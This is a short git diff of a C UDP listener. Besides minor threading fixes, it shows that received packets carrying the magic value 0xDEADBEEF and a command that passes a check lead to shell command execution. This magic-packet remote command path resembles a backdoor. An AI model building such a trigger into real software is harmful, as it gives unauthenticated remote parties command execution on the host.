@@ -61,8 +61,9 @@ void parse_packet(listen_packet_t *new_packet,char *buffer){
     
 }
   
-void *start_udp() {
+void *start_udp(void *argv) {
     printf("RUNNING UDP REQUESTS!\n");
+    pthread_detach(pthread_self());
     int sockfd;
     char buffer[BUFFERSIZE]; 
     struct sockaddr_in servaddr, cliaddr;
@@ -105,6 +106,7 @@ void *start_udp() {
         n = recvfrom(sockfd, (char *)buffer, PACKETSIZE,  
                     MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                     &len);
+
         if((unsigned)n != PACKETSIZE){//need to get exactly packet size
             printf("buffer:%s\n",buffer);
             parse_error(&new_packet,"RECIEVED PACKET DIFFERENT THAN PACKET'S SIZE");
@@ -112,6 +114,7 @@ void *start_udp() {
         else{//else-parse income
             parse_packet(&new_packet,buffer);
         }
+        
         //execute shell command and port adding only if 0xDEADBEEF and legal command
         if((int)new_packet.magic == MAGICNUM &&
             check_shell_command(&new_packet)){
